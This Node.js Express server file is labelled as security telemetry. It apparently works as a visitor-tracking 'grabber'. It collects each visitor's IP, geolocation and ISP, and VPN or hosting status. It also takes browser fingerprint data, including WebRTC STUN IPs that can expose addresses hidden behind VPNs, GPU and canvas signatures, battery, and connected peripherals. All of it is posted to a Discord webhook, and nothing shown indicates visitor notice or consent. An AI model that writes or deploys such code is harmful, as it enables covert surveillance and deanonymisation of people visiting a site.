const express = require('express');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.use(express.json());

// 1. Advanced Client Telemetry Route
app.post('/api/security-telemetry', async (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (clientIp === '::1' || clientIp === '127.0.0.1') clientIp = '127.0.0.1 (Localhost)';
    
    const d = req.body;

    const embed = {
        title: '🛡️ Deep Client Fingerprint & Hardware Intelligence',
        color: 15548997, // Red/Security Alert Tone
        fields: [
            { name: '🖥️ IP Address', value: `\`${clientIp}\``, inline: true },
            { name: '🤖 WebDriver Flag', value: `\`${d.webdriver}\``, inline: true },
            { name: '🌐 WebRTC STUN IPs', value: `\`${d.webrtcIps}\``, inline: false },
            { name: '📺 Display & Screen', value: `\`${d.screen}\` (${d.colorDepth}, ${d.pixelRatio}x DPR)`, inline: false },
            { name: '🧠 Hardware Specs', value: `**CPU Cores:** \`${d.cpuCores}\` | **RAM:** \`${d.deviceMemory}\` | **Touch:** \`${d.maxTouchPoints}\``, inline: false },
            { name: '🔋 Battery Status', value: `\`${d.battery}\``, inline: true },
            { name: '🔊 Audio Stack', value: `\`${d.audio}\``, inline: true },
            { name: '🎮 Graphics (WebGL GPU)', value: `\`\`\`${d.gpu}\`\`\``, inline: false },
            { name: '🎨 Canvas Signature', value: `\`${d.canvasSignature}\``, inline: false },
            { name: '📡 Live Network Speeds', value: `**Type:** \`${d.network.effectiveType}\` | **RTT:** \`${d.network.rtt}ms\` | **Downlink:** \`${d.network.downlink}Mbps\``, inline: false },
            { name: '🎙️ Connected Peripherals', value: `\`\`\`${d.peripherals.join('\n') || 'None detected'}\`\`\``, inline: false }
        ],
        timestamp: new Date().toISOString()
    };

    if (DISCORD_WEBHOOK_URL) {
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        }).catch(err => console.error('Discord Webhook Error:', err));
    }

    res.sendStatus(200);
});

// 2. Protocol & Geolocation Logging Middleware
app.use(async (req, res, next) => {
    if (req.url.includes('.')) return next();

    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (clientIp === '::1' || clientIp === '127.0.0.1') clientIp = '127.0.0.1';

    let geo = { city: 'Unknown', regionName: 'Unknown', country: 'Unknown', isp: 'Unknown', org: 'Unknown', timezone: 'Unknown', hosting: false };
    try {
        const response = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,city,regionName,country,isp,org,timezone,hosting`);
        const data = await response.json();
        if (data.status === 'success') geo = data;
    } catch (e) {}

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referrer = req.headers['referer'] || 'Direct / Typed URL';
    const acceptLang = req.headers['accept-language'] || 'Unknown';
    const platform = (req.headers['sec-ch-ua-platform'] || 'Unknown').replace(/"/g, '');
    const isMobile = req.headers['sec-ch-ua-mobile'] === '?1' ? 'Mobile' : 'Desktop';

    const networkEmbed = {
        title: '🌐 Network Protocol & IP Intelligence Log',
        color: 3447003, // Blue Tone
        fields: [
            { name: '📍 Target IP & Location', value: `**IP:** \`${clientIp}\`\n**Location:** ${geo.city}, ${geo.regionName}, ${geo.country}\n**Timezone:** \`${geo.timezone}\``, inline: false },
            { name: '🏢 ASN / ISP Provider', value: `**ISP:** ${geo.isp}\n**Datacenter/Hosting IP:** \`${geo.hosting ? '⚠️ YES (VPN/Proxy/Cloud)' : 'No (Residential/Mobile)'}\``, inline: false },
            { name: '💻 System Architecture', value: `**Platform:** \`${platform}\` (${isMobile})\n**Languages:** \`${acceptLang}\``, inline: false },
            { name: '🔗 HTTP Referrer', value: `${referrer}`, inline: false },
            { name: '🧩 Raw User-Agent', value: `\`\`\`${userAgent}\`\`\``, inline: false }
        ],
        timestamp: new Date().toISOString()
    };

    if (DISCORD_WEBHOOK_URL) {
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [networkEmbed] })
        }).catch(err => {});
    }

    next();
});

// Serve frontend directory
app.use(express.static(path.join(__dirname, 'public')));

app.listen(PORT, () => {
    console.log(`Security Telemetry Node running at http://localhost:${PORT}`);
});